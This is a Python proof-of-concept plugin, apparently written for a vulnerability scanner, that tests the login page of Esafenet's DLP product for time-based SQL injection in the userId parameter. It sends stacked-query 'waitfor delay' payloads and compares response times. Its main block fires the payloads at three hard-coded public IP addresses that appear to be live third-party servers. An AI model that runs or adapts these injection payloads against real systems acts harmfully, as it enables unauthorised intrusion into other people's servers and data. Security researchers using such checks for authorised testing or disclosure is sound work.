#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 亿赛通数据泄露防护系统(DLP)存在SQL注入漏洞
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0131186
description:
 登录处UserId参数注入
'''

import time

def assign(service, arg):
    if service == 'esafenet_dlp':
        return True, arg

def audit(arg):
    url = arg + 'CDGServer3/3g/LoginAction'
    #sleep 0
    post1 = 'userId=test\';waitfor delay \'0:0:0\'--&password=asdfsd'
    post2 = 'userId=test\';waitfor delay \'0:0:5\'--&password=asdfsd'
    t1 = time.time()
    code, head, res, err, _ = curl.curl2(url, post=post1)
    if code != 200:
        return False
    t2 = time.time()
    code, head, res, err, _ = curl.curl2(url, post=post2)
    if code != 200:
        return False
    t3 = time.time()
    if (t1+t3-2*t2) > 4:
        security_hole('SQL Injection: '+url+' POST:' + post2)
if __name__ == '__main__':
    from dummy import *
    audit(assign('esafenet_dlp', 'http://218.104.98.22/')[1])
    audit(assign('esafenet_dlp', 'http://223.100.144.160:81/')[1])
    audit(assign('esafenet_dlp', 'http://116.213.171.246/')[1])